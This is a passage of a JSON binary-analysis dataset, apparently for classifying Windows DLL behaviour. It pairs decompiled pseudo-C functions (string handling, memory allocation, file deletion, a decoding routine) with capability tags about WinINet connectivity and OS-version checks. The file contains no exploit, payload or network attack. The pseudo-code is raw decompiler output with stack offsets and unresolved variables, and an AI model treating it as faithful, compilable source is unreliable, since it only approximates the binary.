{
    "18000100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180001000(int64_t arg1, int16_t *arg2)\n\n{\n    int16_t iVar1;\n    uchar auVar2 [16];\n    ulong uVar3;\n    uint64_t uVar4;\n    int16_t *piVar5;\n    int16_t *piStack40;\n    int16_t *piStack32;\n    \n    // [00] -r-x section size 217088 named .text\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    uVar4 = 0xffffffffffffffff;\n    piVar5 = arg2;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    auVar2 = ZEXT816(2) * ZEXT816(~uVar4 + 1);\n    uVar3 = SUB168(auVar2, 0);\n    if (SUB168(auVar2 >> 0x40, 0) != 0) {\n        uVar3 = 0xffffffffffffffff;\n    }\n    uVar3 = fcn.180023750(uVar3);\n    *(arg1 + 8) = uVar3;\n    piStack32 = *(arg1 + 8);\n    piStack40 = arg2;\n    do {\n        iVar1 = *piStack40;\n        *piStack32 = iVar1;\n        piStack40 = piStack40 + 1;\n        piStack32 = piStack32 + 1;\n    } while (iVar1 != 0);\n    *(arg1 + 0x10) = 0;\n    uVar3 = fcn.1800011a0(arg1);\n    *(arg1 + 0x20) = uVar3;\n    return arg1;\n}\n",
        "token_count": 443
    },
    "18000159": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180001590(ulong arg1, uint64_t arg2, ulong arg3)\n\n{\n    int32_t iStack24;\n    \n    iStack24 = fcn.1800160c0(arg1, arg2 / 2, 0x7fffffff);\n    if (-1 < iStack24) {\n        iStack24 = fcn.180001610(arg1, arg2 / 2, 0, arg3);\n    }\n    return iStack24;\n}\n",
        "token_count": 108
    },
    "18000161": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180001610(int16_t *arg1, int64_t arg2, int64_t *arg3, int16_t *arg4)\n\n{\n    int16_t *piStackX8;\n    int64_t iStackX16;\n    int16_t *piStackX32;\n    int64_t in_stack_00000028;\n    int64_t iStack24;\n    uint uStack16;\n    \n    uStack16 = 0;\n    iStack24 = 0;\n    piStackX8 = arg1;\n    iStackX16 = arg2;\n    for (piStackX32 = arg4; ((iStackX16 != 0 && (in_stack_00000028 != 0)) && (*piStackX32 != 0));\n        piStackX32 = piStackX32 + 1) {\n        *piStackX8 = *piStackX32;\n        piStackX8 = piStackX8 + 1;\n        iStackX16 = iStackX16 + -1;\n        in_stack_00000028 = in_stack_00000028 + -1;\n        iStack24 = iStack24 + 1;\n    }\n    if (iStackX16 == 0) {\n        piStackX8 = piStackX8 + -1;\n        iStack24 = iStack24 + -1;\n        uStack16 = 0x8007007a;\n    }\n    *piStackX8 = 0;\n    if (arg3 != NULL) {\n        *arg3 = iStack24;\n    }\n    return uStack16;\n}\n",
        "token_count": 344
    },
    "18000183": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180001830(int64_t arg1)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    \n    fcn.1800011f0(arg1 + 0x80, 0x51);\n    cVar1 = (**0x18004ac60)(*(arg1 + 0x20), arg1 + 0x80, 0x49, 0x78);\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    if (*(arg1 + 0x9c) != 0) {\n        iVar3 = -1;\n        pcVar4 = arg1 + 0xa4;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (iVar3 == -0x22) {\n            if (*(arg1 + 0xc5) != 0) {\n                uVar2 = fcn.180015b40(*(arg1 + 0xc5));\n                *(arg1 + 0xc9) = uVar2;\n                cVar1 = (**0x18004ac60)(*(arg1 + 0x20), *(arg1 + 0xc9), *(arg1 + 0xc5), 0x78);\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n            }\n            fcn.1800011f0(arg1 + 0x122, 0x51);\n            cVar1 = (**0x18004ac60)(*(arg1 + 0x20), arg1 + 0x122, 0x49, 0x78);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            if (*(arg1 + 0x13e) != 0) {\n                iVar3 = -1;\n                pcVar4 = arg1 + 0x146;\n                do {\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                if (iVar3 == -0x22) {\n                    if (*(arg1 + 0x167) != 0) {\n                        uVar2 = fcn.180015b40(*(arg1 + 0x167));\n                        *(arg1 + 0x16b) = uVar2;\n                        cVar1 = (**0x18004ac60)(*(arg1 + 0x20), *(arg1 + 0x16b), *(arg1 + 0x167), 0x78);\n                        if (cVar1 == '\\0') {\n                            return 0;\n                        }\n                    }\n                    return 1;\n                }\n            }\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 674
    },
    "180001a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180001a60(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    code *pcVar3;\n    \n    if (*(arg1 + 0x178) != 0) {\n        fcn.180015b80(arg1 + 0x178);\n    }\n    if (*(arg1 + 0xc9) != 0) {\n        fcn.180015b80(arg1 + 0xc9);\n    }\n    if (*(arg1 + 0x11a) != 0) {\n        fcn.180015b80(arg1 + 0x11a);\n    }\n    if (*(arg1 + 0x16b) != 0) {\n        fcn.180015b80(arg1 + 0x16b);\n    }\n    uVar2 = fcn.1800020d0(arg1 + 0x58);\n    pcVar3 = fcn.18001e5f0(0x180039df8);\n    iVar1 = (*pcVar3)(uVar2);\n    if (iVar1 != 0) {\n        uVar2 = fcn.1800020d0(arg1 + 0x58);\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 289
    },
    "180001b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180001b40(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    uchar auStack136 [40];\n    char acStack96 [40];\n    uchar auStack56 [8];\n    uchar uStack48;\n    uchar uStack47;\n    char *pcStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack136;\n    if ((*(arg1 + 0x167) == 0) && (*(arg1 + 0x13e) != 0)) {\n        pcStack40 = arg1 + 0x146;\n        uStack32 = 0;\n        iVar4 = -1;\n        pcVar6 = pcStack40;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        if (iVar4 == -0x22) {\n            if (*(arg1 + 0x178) != 0) {\n                fcn.180015b80(arg1 + 0x178);\n            }\n            uVar3 = fcn.180015b40(*(arg1 + 0x13e));\n            *(arg1 + 0x178) = uVar3;\n            *(arg1 + 0x180) = *(arg1 + 0x13e);\n            cVar1 = (**0x18004ac60)(*(arg1 + 0x20), *(arg1 + 0x178), *(arg1 + 0x180), 0x78);\n            if (cVar1 != '\\0') {\n                pcVar6 = acStack96;\n                for (iVar4 = 0x21; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *pcVar6 = '\\0';\n                    pcVar6 = pcVar6 + 1;\n                }\n                fcn.180007a60(auStack56);\n                fcn.180009740(auStack56, *(arg1 + 0x178), *(arg1 + 0x13e), acStack96);\n                uVar5 = 0xffffffffffffffff;\n                pcVar6 = acStack96;\n                do {\n                    if (uVar5 == 0) break;\n                    uVar5 = uVar5 - 1;\n                    cVar1 = *pcVar6;\n                    pcVar6 = pcVar6 + 1;\n                } while (cVar1 != '\\0');\n                iVar2 = fcn.180030ca8(arg1 + 0x146, acStack96, ~uVar5 - 1);\n                if (iVar2 == 0) {\n                    uStack47 = 1;\n                    fcn.180007ac0(auStack56);\n                }\n                else {\n                    uStack48 = 0;\n                    fcn.180007ac0(auStack56);\n                }\n            }\n        }\n    }\n    fcn.180023980(uStack24 ^ auStack136);\n    return;\n}\n",
        "token_count": 718
    },
    "180001fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180001fb0(int64_t arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uStackX24;\n    \n    if (*(arg1 + 0x10) < arg2) {\n        fcn.1800027f0(arg1);\n    }\n    uStackX24 = arg3;\n    if (*(arg1 + 0x10) - arg2 < arg3) {\n        uStackX24 = *(arg1 + 0x10) - arg2;\n    }\n    if (uStackX24 != 0) {\n        iVar1 = *(arg1 + 0x10);\n        iVar2 = fcn.1800027b0(arg1);\n        iVar3 = fcn.1800027b0(arg1);\n        fcn.180001500(iVar3 + arg2 * 2, iVar2 + arg2 * 2 + uStackX24 * 2, (iVar1 - arg2) - uStackX24);\n        fcn.1800026c0(arg1, *(arg1 + 0x10) - uStackX24);\n    }\n    return arg1;\n}\n",
        "token_count": 277
    },
    "18000241": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180002410(int64_t arg1, ulong arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iStack40;\n    int64_t iStack24;\n    \n    if ((((arg4 != 0) || (uVar4 = arg3,  *(arg1 + 0x10) < arg3)) && (uVar4 = *0x180039ea8,  arg3 < *(arg1 + 0x10))) &&\n       (uVar2 = *(arg1 + 0x10) - arg3,  arg4 <= uVar2)) {\n        iStack40 = uVar2 - (arg4 - 1);\n        iStack24 = fcn.1800027b0(arg1);\n        iStack24 = iStack24 + arg3 * 2;\n        while (arg1_00 = fcn.1800014d0(iStack24, iStack40, arg2),  uVar4 = *0x180039ea8,  arg1_00 != 0) {\n            iVar1 = fcn.180001440(arg1_00, arg2, arg4);\n            if (iVar1 == 0) {\n                iVar3 = fcn.1800027b0(arg1);\n                return arg1_00 - iVar3 >> 1;\n            }\n            iStack40 = iStack40 - ((arg1_00 - iStack24 >> 1) + 1);\n            iStack24 = arg1_00 + 2;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 385
    },
    "18000255": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180002550(int64_t arg1, ulong arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iStack40;\n    uint64_t uStack24;\n    \n    if (arg4 == 0) {\n        uVar4 = arg3;\n        if (*(arg1 + 0x10) <= arg3) {\n            uVar4 = *(arg1 + 0x10);\n        }\n    }\n    else {\n        uVar4 = *0x180039ea8;\n        if (arg4 <= *(arg1 + 0x10)) {\n            uStack24 = arg3;\n            if (*(arg1 + 0x10) - arg4 <= arg3) {\n                uStack24 = *(arg1 + 0x10) - arg4;\n            }\n            iStack40 = fcn.1800027b0(arg1);\n            iStack40 = iStack40 + uStack24 * 2;\n            while ((cVar1 = fcn.180001550(iStack40, arg2),  cVar1 == '\\0' ||\n                   (iVar2 = fcn.180001440(iStack40, arg2, arg4),  iVar2 != 0))) {\n                iVar3 = fcn.1800027b0(arg1);\n                if (iStack40 == iVar3) {\n                    return *0x180039ea8;\n                }\n                iStack40 = iStack40 + -2;\n            }\n            iVar3 = fcn.1800027b0(arg1);\n            uVar4 = iStack40 - iVar3 >> 1;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 392
    },
    "18000271": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180002710(ulong *arg1, ulong noname_1, int64_t arg3)\n\n{\n    ulong arg2;\n    \n    if ((noname_1 != '\\0') && (7 < arg1[3])) {\n        arg2 = *arg1;\n        if (arg3 != 0) {\n            fcn.1800014a0(arg1, arg2, arg3);\n        }\n        fcn.18000d120(arg1 + 4, arg2, arg1[3] + 1);\n    }\n    arg1[3] = 7;\n    fcn.1800026c0(arg1, arg3);\n    return;\n}\n",
        "token_count": 149
    },
    "1800029c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.1800029c0(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    char in_R8B;\n    uint64_t uStack24;\n    \n    uVar2 = arg2;\n    uVar1 = fcn.180002bc0(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000c240(arg1);\n    }\n    if (*(arg1 + 0x18) < arg2) {\n        fcn.180002c10(arg1, arg2, *(arg1 + 0x10));\n    }\n    else if ((in_R8B == '\\0') || (7 < arg2)) {\n        if (arg2 == 0) {\n            fcn.1800026c0(arg1, 0);\n        }\n    }\n    else {\n        uStack24 = arg2;\n        if (*(arg1 + 0x10) <= arg2) {\n            uStack24 = *(arg1 + 0x10);\n        }\n        fcn.180002710(arg1, CONCAT71(uVar2 >> 8, 1), uStack24);\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 272
    },
    "180002aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180002aa0(int64_t arg1, ulong arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uStackX32;\n    \n    uVar2 = fcn.1800020f0(arg2);\n    if (uVar2 < arg3) {\n        fcn.1800027f0(arg1);\n    }\n    iVar3 = fcn.1800020f0(arg2);\n    uStackX32 = arg4;\n    if (iVar3 - arg3 < arg4) {\n        uStackX32 = iVar3 - arg3;\n    }\n    if (*0x180039ea8 - *(arg1 + 0x10) <= uStackX32) {\n        fcn.18000c240(arg1);\n    }\n    if (uStackX32 != 0) {\n        iVar3 = *(arg1 + 0x10) + uStackX32;\n        cVar1 = fcn.1800029c0(arg1, iVar3);\n        if (cVar1 != '\\0') {\n            iVar4 = fcn.1800027b0(arg2);\n            iVar5 = fcn.1800027b0(arg1);\n            fcn.1800014a0(iVar5 + *(arg1 + 0x10) * 2, iVar4 + arg3 * 2, uStackX32);\n            fcn.1800026c0(arg1, iVar3);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 366
    },
    "180002bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180002bc0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iStack16;\n    \n    uVar1 = fcn.180002e10(arg1 + 0x20);\n    if (uVar1 < 2) {\n        iStack16 = 1;\n    }\n    else {\n        iStack16 = uVar1 - 1;\n    }\n    return iStack16;\n}\n",
        "token_count": 100
    },
    "180002c1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180002c10(ulong *arg1, uint64_t arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    uint64_t uStack64;\n    \n    uVar1 = arg2 | 7;\n    uVar2 = fcn.180002bc0(arg1);\n    uStack64 = arg2;\n    if ((uVar1 <= uVar2) && (uStack64 = uVar1,  uVar1 / 3 < arg1[3] / 2)) {\n        uVar1 = arg1[3];\n        iVar3 = fcn.180002bc0(arg1);\n        uVar1 = iVar3 - uVar1 / 2;\n        if (arg1[3] < uVar1 || arg1[3] == uVar1) {\n            uStack64 = arg1[3] / 2 + arg1[3];\n        }\n        else {\n            uStack64 = fcn.180002bc0(arg1);\n        }\n    }\n    iVar3 = uStack64 + 1;\n    arg1_00 = fcn.180002df0(arg1 + 4, iVar3);\n    if (arg3 != 0) {\n        iVar3 = fcn.1800027b0(arg1);\n        fcn.1800014a0(arg1_00, iVar3, arg3);\n    }\n    fcn.180002710(arg1, CONCAT71(iVar3 >> 8, 1), 0);\n    *arg1 = arg1_00;\n    arg1[3] = uStack64;\n    fcn.1800026c0(arg1, arg3);\n    return;\n}\n",
        "token_count": 391
    },
    "180002d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180002d90(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t in_RAX;\n    int64_t iVar1;\n    \n    if ((arg2 != 0) && (in_RAX = fcn.1800027b0(arg1),  in_RAX <= arg2)) {\n        iVar1 = fcn.1800027b0(arg1);\n        in_RAX = iVar1 + *(arg1 + 0x10) * 2;\n        if (arg2 < in_RAX) {\n            return CONCAT71(in_RAX >> 8, 1);\n        }\n    }\n    return in_RAX & 0xffffffffffffff00;\n}\n",
        "token_count": 153
    },
    "180002fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180002fc0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int64_t iStackX16;\n    ulong uStackX24;\n    int64_t iStackX32;\n    ulong uStack24;\n    \n    uStack24 = 0x180002fdb;\n    iStackX16 = arg2;\n    uStackX24 = arg3;\n    iVar2 = fcn.1800303a0();\n    iVar2 = -iVar2;\n    *(&stack0x00020148 + iVar2) = *0x180040248 ^ &stack0xfffffffffffffff0 + iVar2;\n    *(&stack0x00000030 + iVar2) = 0;\n    puVar4 = &stack0x000200a0 + iVar2;\n    for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = *(&stack0x00020178 + iVar2);\n    puVar5 = &stack0x000200a0 + iVar2;\n    for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(&stack0x00020068 + iVar2) = 0;\n    *(&stack0x00010040 + iVar2) = 0;\n    while (*(&stack0x00010040 + iVar2) < 8) {\n        *(&stack0x00020068 + iVar2) =\n             *(&stack0x00020068 + iVar2) +\n             ((&stack0x000200a0)[(*(&stack0x00010040 + iVar2) + 5) + iVar2] << (*(&stack0x00010040 + iVar2) << 3 & 0x3f)\n             );\n        *(&stack0x00010040 + iVar2) = *(&stack0x00010040 + iVar2) + 1;\n    }\n    *(&stack0x000200c8 + iVar2) = 0;\n    *(&stack0x000200c0 + iVar2) = 0;\n    *(&stack0xffffffffffffffe8 + iVar2) = 0x1800030cc;\n    uVar1 = fcn.180007620(&stack0x000200b0 + iVar2, &stack0x000200a0 + iVar2, 5, 0x180048ab0);\n    *(&stack0x00020140 + iVar2) = uVar1;\n    if (*(&stack0x00020140 + iVar2) == 0) {\n        if (*(&stack0x00020068 + iVar2) == -1) {\n            *(&stack0x00020144 + iVar2) = 0;\n        }\n        else {\n            *(&stack0x00020144 + iVar2) = 1;\n        }\n        *(&stack0x00020070 + iVar2) = *(&stack0x00020144 + iVar2);\n        *(&stack0x00020060 + iVar2) = 0;\n        *(&stack0x00020080 + iVar2) = 0;\n        *(&stack0x00020090 + iVar2) = 0;\n        *(&stack0x00020078 + iVar2) = 0;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180003157;\n        fcn.180006a00(&stack0x000200b0 + iVar2);\n        *(&stack0x00020050 + iVar2) = *(&stack0x00020068 + iVar2);\n        *(&stack0x00020058 + iVar2) = *(&stack0x00020068 + iVar2);\n        *(&stack0x00020098 + iVar2) = 0;\n        *(&stack0x00000020 + iVar2) = &stack0x00020088 + iVar2;\n        *(&stack0x00000018 + iVar2) = *(&stack0x00020098 + iVar2);\n        *(&stack0x00000010 + iVar2) = &stack0x00020050 + iVar2;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x1800031d3;\n        uVar1 = fcn.1800070e0(&stack0x000200b0 + iVar2, *(&stack0x00020180 + iVar2), &stack0x00020058 + iVar2, \n                              *(&stack0x00020178 + iVar2) + 0xd);\n        *(&stack0x00000030 + iVar2) = uVar1;\n        if (((*(&stack0x00000030 + iVar2) == 0) &&\n            ((*(&stack0x00020070 + iVar2) == 0 || (*(&stack0x00020068 + iVar2) != 0)))) &&\n           ((*(&stack0x00020050 + iVar2) != 0 || (*(&stack0x00020058 + iVar2) != 0)))) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x18000323d;\n            fcn.180007390(&stack0x000200b0 + iVar2, 0x180048ab0);\n        }\n    }\n    *(&stack0xffffffffffffffe8 + iVar2) = 0x180003252;\n    fcn.180023980(*(&stack0x00020148 + iVar2) ^ &stack0xfffffffffffffff0 + iVar2);\n    return;\n}\n",
        "token_count": 1305
    },
    "18000326": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180003260(ulong arg1, ulong arg2, uint32_t *arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uchar auStack136 [32];\n    uchar *puStack104;\n    ulong uStack96;\n    int32_t iStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    uchar auStack40 [8];\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack136;\n    iStack88 = 0;\n    uStack32 = *arg3;\n    uStack72 = in_stack_00000028;\n    puVar2 = auStack40;\n    for (iVar1 = 5; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    uStack56 = 5;\n    uStack80 = arg2;\n    uStack64 = arg4;\n    fcn.180023f9c(auStack40, 5, in_stack_00000030, in_stack_00000038);\n    uStack96 = 5;\n    puStack104 = auStack40;\n    iStack88 = fcn.180007920(uStack80, &uStack32, uStack64, &uStack72);\n    if (iStack88 == 0) {\n        *arg3 = uStack32;\n    }\n    fcn.180023980(uStack24 ^ auStack136);\n    return;\n}\n",
        "token_count": 408
    },
    "1800034f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1800034f0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.180024064(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 70
    },
    "18000354": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180003540(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, arg1, 0x1000, 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "18000358": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180003580(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(arg1, 0, 0x8000);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "1800035b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1800035b0(uint *arg1, uint64_t arg2, uint8_t *arg3)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    int64_t iVar11;\n    uint32_t uVar12;\n    uchar *puVar13;\n    uint32_t uStack344;\n    uint32_t uStack328;\n    uint32_t uStack324;\n    uint32_t uStack304;\n    uint32_t uStack300;\n    uint32_t uStack296;\n    uint8_t *puStack288;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    uint64_t uStack264;\n    uint32_t uStack248;\n    uint16_t *puStack232;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    uint32_t uStack216;\n    uint32_t uStack196;\n    uint16_t *puStack192;\n    int32_t iStack184;\n    uint32_t uStack180;\n    uint32_t uStack176;\n    int32_t iStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack152;\n    uint32_t uStack144;\n    uint32_t uStack136;\n    uint64_t uStack128;\n    uchar *puStack112;\n    uint64_t uStack88;\n    uint32_t uStack76;\n    uint64_t uStack72;\n    uint32_t uStack64;\n    uint64_t uStack56;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint64_t uStack24;\n    \n    iVar6 = *(arg1 + 4);\n    uStack248 = arg1[0x12];\n    uStack328 = arg1[0x13];\n    uStack344 = arg1[0x14];\n    uStack272 = 